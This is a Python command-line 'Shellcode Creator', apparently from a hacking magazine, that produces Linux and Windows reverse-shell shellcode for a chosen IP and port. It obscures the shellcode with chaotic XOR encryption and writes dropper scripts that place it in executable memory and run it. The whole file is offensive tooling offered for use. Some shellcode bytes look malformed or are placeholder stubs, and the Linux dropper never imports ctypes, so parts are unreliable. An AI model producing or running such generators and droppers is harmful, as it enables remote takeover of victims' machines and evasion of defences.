import random
import os
import socket
import struct
import pyfiglet
import colorama
import time


def banner_art():
    print(""" 
    
                                                                                                                                                                                    
                                        ^d@@@@@@@@@@@@@@@@@Dr                                       
                                 *#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B!                                
                             Q@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8                            
                         P@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@}                        
                      H@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@L                     
                   =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#                   
                 d@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=                
               6@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=              
             Y@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@             
            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@$           
          t@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@          
         #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~        
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@z       
       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@m      
      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@|     
     #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#=         ^@@@@@@@@@@@@@@     
    }@@@@@@@@@@@@@8t}tB@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#                n@@@@@@@@@@@@    
    @@@@@@@@@@L           #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#     =#@@@@@@@@$    E@@@@@@@@@@z   
   8@@@@@@@@v      __       #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@@@@@@@@@@@@@@  _@@@@@@@@@@   
   @@@@@@@@   #@@@@@@@@@@_   -@@@@@@@@@@@@@@@@@`@@@@@@@@@@@@@Q    @@@@@@@@@@@@@@@@@@@@n8@@@@@@@@@`  
  `@@@@@@@gx@@@@@@@@@@@@@@@_   B@@@@@@@@@@@@@@D @@@@@@@@@@@@c   B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#  
  B@@@@@@@@@@@@@@@@@@@@@@@@@#   ?@@@@@@@@@L#@@  X@@8-@@@@@@=   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@: $@  .@#  @@@@@`  |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
  @@@@@@@@@@d^.   =V#@@@@@@@@@-    L@@@@@@@  @   @  ~@@@@    `#@@@@@@@@@@@@@d             r@@@@@@@  
  @@@@@@@@#zYYv=        -#@@@        }@@@@@  @   @   @@8        @@@@@@@@Q       :m#@@@@@#h_ Z@@@@@  
  @@@@@@@@8^#@@@@@@@@6                  _~   @   @m              @@@@8     ~#@@@@@@@@@c  P@@@@@@@@  
  c@@@@Y    h@@@@@@@@@@@@D                  @@   @@g             @n     P@@@@@@@@@@@@@8    W@@@@@@  
   @@@n `   @@@@@8^         >         @@@=            B@             B@@@@@@@@@@@@@@@@@B    @@@@@r  
   @@@@@.  @@W                          P@@E-      L@@@?         6@@@@@@@@@@@@@@@@@@@@@x  z@@@@@@   
   _@@@@.                            Y@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#_    @@@@@@6   
    @@@@@,     D@@@#                      L#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#X`       w@@@@@@@    
     @@@@@@@   @@@@@8    ndn.                     ,LHg#@@@@@@@#B6hY>.              =   ?@@@@@@@     
     >@@@@@@d  @@@@@  c@@@@@@@,   m@@@@@@@@:                                 L@@@} 8   @@@@@@@X     
      z@@@@@@   @@@  @@@@@@@@@  x@@@@@@@@@@@@z      w@@@@@@@@@V     W@@@@@$  @@@@@    r@@@@@@8      
       w@@@@@8   *d  @@@@@@@@  _@@@@@@@@@@@@@@    6@@@@@@@@@@@@@8  r@@@@@@@  @@@@@    @@@@@@z       
        |@@@@@z      #@@@@@@@  @@@@@@@@@@@@@@@X   @@@@@@@@@@@@@@@  z@@@@@@@  V@@Q    Q@@@@@?        
          @@@@@h      !@@@@@@  #@@@@@@@@@@@@@@#  V@@@@@@@@@@@@@@@  B@@@@@@@   ~     @@@@@@          
           #@@@@B         _r,  `@@@@@@@@@@@@@@g  t@@@@@@@@@@@@@@@  @@@@@@6        r@@@@@#           
            !@@@@@    #?        ~@@@@@@@@@@@@@   ?@@@@@@@@@@@@@@   6Ex      6_   @@@@@@,            
              Z@@@@#    8 .@@@W       `rmB@@#     #@@@@@@@@@@@D          gD    Q@@@@@h              
                8@@@@#     .@@@* ##dv_                          d@@@@@       #@@@@@P                
                  Z@@@@@V         @@@@@@@@@@@@   @@@@@@@@@@@@@  @@@Q      m@@@@@@z                  
                    `@@@@@@E        *8@@@@@@@@   @@@@@@@@@@@m          Q@@@@@@#                     
                       r@@@@@@@#>                                 r#@@@@@@@@.                       
                           B@@@@@@@@@@8n=                 ,}8@@@@@@@@@@@W      NufSed - d8rh8r                    
                               d@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@L          HVCK Magazine                     
                                    ,W@@@@@@@@@@@@@@@@@@@@@@@#w                                  
                                                                                    
                                                   
                                                                                                                                                        
    """ )
# Parameters for the logistic map
r = 3.99  # Control parameter for chaotic system

# Function to generate chaotic keys using logistic map
def generate_chaotic_keys(length, r, x0):
    x = x0
    chaotic_keys = []
    for _ in range(length):
        x = r * x * (1 - x)  # Logistic map equation
        chaotic_value = int(x * 255)  # Convert chaotic output to an integer between 0 and 255
        while chaotic_value == 0:  # Ensure the key is non-zero
            x = r * x * (1 - x)
            chaotic_value = int(x * 255)
        chaotic_keys.append(chaotic_value)
    return chaotic_keys

# XOR encryption/decryption
def xor_encrypt_decrypt(data, keys):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ keys[i])
    return result

# Generate reverse shellcode template for Linux x64 TCP
def generate_linux_reverse_shell(ip, port):
    try:
        socket.inet_aton(ip)
    except socket.error:
        raise ValueError("Invalid IP address")
    if not (1 <= port <= 65535):
        raise ValueError("Invalid port number. Must be between 1 and 65535.")

    packed_ip = struct.unpack(">I", socket.inet_aton(ip))[0]
    packed_port = struct.pack(">H", port)

    shellcode = bytearray([
        0x48, 0x31, 0xff, 0x48, 0xf7, 0xe6, 0x04, 0x29, 0x0f, 0x05,     # syscall socket
        0x48, 0x89, 0xc7,                                               # mov rdi, rax
        0x48, 0x31, 0xc0, 0x50,                                         # push rax (zero)
        packed_port[0], packed_port[1],                                 # push port (network byte order)
        0x66, 0x68, (packed_ip >> 24) & 0xFF, (packed_ip >> 16) & 0xFF, # push IP address
        (packed_ip >> 8) & 0xFF, packed_ip & 0xFF,                      #
        0x48, 0x89, 0xe6,                                               # mov rsi, rsp
        0x04, 0x31, 0x0f, 0x05,                                         # syscall connect
        0x48, 0x31, 0xff, 0x57, 0x57, 0x57,                             # push /bin/sh
        0x5f, 0x6a, 0x3b, 0x58,                                         # pop rsp, syscall execve
        0x48, 0x89, 0xe7, 0x0f, 0x05
    ])
    return shellcode

# Generate reverse shellcode template for Windows x64 TCP
def generate_windows_reverse_shell(ip, port):
    try:
        socket.inet_aton(ip)
    except socket.error:
        raise ValueError("Invalid IP address")
    if not (1 <= port <= 65535):
        raise ValueError("Invalid port number. Must be between 1 and 65535.")

    packed_ip = socket.inet_aton(ip)
    packed_port = struct.pack(">H", port)

    shellcode = bytearray([
        # Reverse shellcode example for Windows (customized)
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00,  # Example stub
        *packed_ip,
        packed_port[0], packed_port[1]
    ])
    return shellcode

# Create a dropper script for Linux or Windows
def create_dropper(shellcode, platform, filename):
    if platform == "linux":
        dropper_code = f"""
import mmap

shellcode = bytearray({list(shellcode)})

# Allocate memory for the shellcode
exec_mem = mmap.mmap(-1, len(shellcode), mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
exec_mem.write(shellcode)

# Execute the shellcode
exec_func = ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_buffer(exec_mem, len(shellcode))))
exec_func()
"""
    elif platform == "windows":
        dropper_code = f"""
import ctypes

shellcode = bytearray({list(shellcode)})

# Allocate executable memory
size = len(shellcode)
executable_memory = ctypes.windll.kernel32.VirtualAlloc(None, size, 0x3000, 0x40)
if not executable_memory:
    raise MemoryError("Failed to allocate executable memory.")

ctypes.memmove(executable_memory, ctypes.c_char_p(shellcode), size)

# Create a function pointer to execute the shellcode
func = ctypes.CFUNCTYPE(None)(executable_memory)
func()
"""

    # Save the dropper to a file
    with open(filename, "w") as f:
        f.write(dropper_code)
    print(f"Dropper saved to {filename}")

# Display the menu
def display_menu():
    print("\n=== Shellcode Creator CLI ===")
    print("1. Create Linux Reverse Shellcode")
    print("2. Create Windows Reverse Shellcode")
    print("3. Encrypt Shellcode")
    print("4. Decrypt Shellcode")
    print("5. Save Shellcode to File")
    print("6. Load Shellcode from File")
    print("7. Display Shellcode as Byte Code or Byte Array")
    print("8. Create Dropper for Shellcode")
    print("9. Exit")

# Main program
def main():
    shellcode = None
    keys = None

    while True:
        display_menu()
        choice = input("Enter your choice: ")

        if choice == "1":
            ip = input("Enter the target IP address for the reverse shell: ")
            port = int(input("Enter the target port number for the reverse shell: "))
            try:
                shellcode = generate_linux_reverse_shell(ip, port)
                print(f"Linux Reverse shellcode created for IP {ip} and port {port}.")
            except ValueError as e:
                print(f"Error: {e}")

        elif choice == "2":
            ip = input("Enter the target IP address for the reverse shell: ")
            port = int(input("Enter the target port number for the reverse shell: "))
            try:
                shellcode = generate_windows_reverse_shell(ip, port)
                print(f"Windows Reverse shellcode created for IP {ip} and port {port}.")
            except ValueError as e:
                print(f"Error: {e}")

        elif choice == "3":
            if shellcode is None:
                print("No shellcode to encrypt. Create or load shellcode first.")
            else:
                x0 = random.uniform(0, 1)
                keys = generate_chaotic_keys(len(shellcode), r, x0)
                shellcode = xor_encrypt_decrypt(shellcode, keys)
                print(f"Encrypted Shellcode: {shellcode.hex()}")

        elif choice == "4":
            if shellcode is None or keys is None:
                print("No shellcode or keys available for decryption.")
            else:
                shellcode = xor_encrypt_decrypt(shellcode, keys)
                print(f"Decrypted Shellcode: {shellcode.hex()}")

        elif choice == "5":
            if shellcode is None:
                print("No shellcode to save.")
            else:
                shellcode_file = input("Enter filename to save shellcode: ")
                keys_file = input("Enter filename to save keys: ")
                with open(shellcode_file, "wb") as f:
                    f.write(shellcode)
                with open(keys_file, "w") as f:
                    f.write(",".join(map(str, keys)) if keys else "")
                print(f"Shellcode saved to {shellcode_file}")

        elif choice == "6":
            shellcode_file = input("Enter filename to load shellcode: ")
            keys_file = input("Enter filename to load keys (optional): ")
            try:
                with open(shellcode_file, "rb") as f:
                    shellcode = bytearray(f.read())
                print(f"Shellcode loaded.")
                if os.path.exists(keys_file):
                    with open(keys_file, "r") as f:
                        keys = list(map(int, f.read().strip().split(",")))
                    print("Keys loaded.")
                else:
                    keys = None
            except FileNotFoundError:
                print("File not found.")

        elif choice == "7":
            if shellcode is None:
                print("No shellcode to display.")
            else:
                display_format = input("Display as (1) Byte Code or (2) Byte Array? ")
                if display_format == "1":
                    print(f"Shellcode Byte Code: {shellcode.hex()}")
                elif display_format == "2":
                    print("Shellcode Byte Array:")
                    print(", ".join(f"0x{byte:02x}" for byte in shellcode))

        elif choice == "8":
            if shellcode is None:
                print("No shellcode available to create a dropper.")
            else:
                platform = input("Enter target platform (linux/windows): ").lower()
                if platform not in ("linux", "windows"):
                    print("Invalid platform. Choose 'linux' or 'windows'.")
                else:
                    filename = input("Enter filename for the dropper script: ")
                    create_dropper(shellcode, platform, filename)

        elif choice == "9":
            print("Exiting...")
            break

        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    banner_art()
    time.sleep(5)
    main()
